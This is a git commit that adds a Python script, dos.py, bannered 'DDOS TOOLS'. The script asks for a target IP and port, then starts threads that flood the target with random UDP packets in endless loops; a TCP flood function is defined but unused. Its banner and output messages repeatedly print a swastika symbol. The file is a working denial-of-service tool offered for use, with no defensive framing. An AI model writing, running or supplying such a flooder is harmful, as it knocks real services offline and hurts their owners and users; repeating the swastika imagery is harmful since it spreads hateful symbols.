de56eac56c951507f1bb323ab89cbd81f4c38cfa
The Zyrenn <108138548+Zyrenn@users.noreply.github.com>
2023-09-28 01:25:08 +0700

    Add files via upload

---
+++ dos.py
@@ -0,0 +1,59 @@
+import random
+import socket
+import threading
+
+print("~~~ DDOS TOOLS ~~~")
+print("~~~ 卐 ~~~")
+
+ip = str(input(" Target Ip:"))
+port = int(input(" Target Port:"))
+choice = str(input(" UDP(y/n):"))
+times = int(input(" Paket yang dikirim ke target:"))
+threads = int(input(" Threads yang dikirim:"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Down")
+		except:
+			print("[!] Error tod")
+
+def run2():
+	data = random._urandom(2000)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Sending!! ")
+		except:
+			print("[!] Error ")
+
+def run3():
+	data = random._urandom(3024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sending 卐")
+		except:
+			s.close()
+			print("[*] Error")            
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
